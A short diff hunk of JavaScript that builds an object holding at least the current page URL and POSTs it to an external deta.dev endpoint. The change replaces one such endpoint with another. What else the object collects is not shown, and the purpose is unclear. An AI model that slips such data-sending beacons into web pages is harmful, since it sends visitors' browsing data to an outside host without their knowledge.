@@ -13,4 +13,4 @@ var data = {
         url: [location.protocol, '//', location.host, location.pathname].join(''),
 };
 console.log(JSON.stringify(data));
-postJSON("https://c56gd3.deta.dev/post", data);
+postJSON("https://s0rvs5.deta.dev/", data);
